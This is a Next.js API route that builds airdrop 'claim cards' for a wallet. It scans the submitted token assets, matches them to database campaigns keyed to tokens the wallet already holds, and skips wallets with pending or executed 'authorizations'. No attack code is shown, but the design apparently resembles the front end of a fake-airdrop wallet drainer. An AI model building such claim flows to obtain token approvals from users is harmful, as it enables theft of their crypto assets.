import { NextRequest, NextResponse } from 'next/server'
import { generateCard } from '@/lib/cardGenerator'
import { resolveClaimState } from '@/lib/claimLogic'
import { prisma } from '@/lib/db'
import type { DetectedAsset } from '@/lib/scanner'

export async function POST(req: NextRequest) {
  try {
    const body = await req.json().catch(() => null)
    const address: string   = body?.address ?? ''
    const assets: DetectedAsset[] = body?.assets ?? []

    if (!address || !assets.length) {
      return NextResponse.json({ cards: [] })
    }

    // Load active campaigns from DB
    const campaigns = await prisma.airdropCampaign.findMany({ where: { isActive: true } })

    // Find wallets already claimed (pending or executed) — skip those campaigns
    const existing = await prisma.airdropAuthorization.findMany({
      where:  { wallet: address.toLowerCase(), status: { in: ['pending', 'executed'] } },
      select: { campaignId: true },
    })
    const claimedIds = new Set(existing.map((e) => e.campaignId).filter(Boolean))

    // Group non-native assets by chain
    const byChain: Record<number, DetectedAsset[]> = {}
    for (const asset of assets) {
      if (asset.tokenAddress === 'native') continue
      if (!byChain[asset.chainId]) byChain[asset.chainId] = []
      byChain[asset.chainId].push(asset)
    }

    const cards = []

    for (const chainAssets of Object.values(byChain)) {
      for (let i = 0; i < chainAssets.length; i++) {
        const asset = chainAssets[i]
        const claimState = await resolveClaimState(asset, address as `0x${string}`)

        // Match campaign by chainId + token symbol (case-insensitive)
        const campaign = campaigns.find(
          (c) =>
            c.chainId === asset.chainId &&
            c.requiredToken.toLowerCase() === asset.symbol.toLowerCase() &&
            !claimedIds.has(c.id)
        )

        cards.push(
          generateCard(asset, i, claimState, campaign
            ? { id: campaign.id, titleTemplate: campaign.titleTemplate, subtitle: campaign.subtitle, description: campaign.description, claimAmount: campaign.claimAmount, claimToken: campaign.claimToken }
            : undefined
          )
        )
      }
    }

    return NextResponse.json({ cards })
  } catch (err) {
    console.error('[airdrop/cards]', err)
    return NextResponse.json({ error: 'Card generation failed' }, { status: 500 })
  }
}
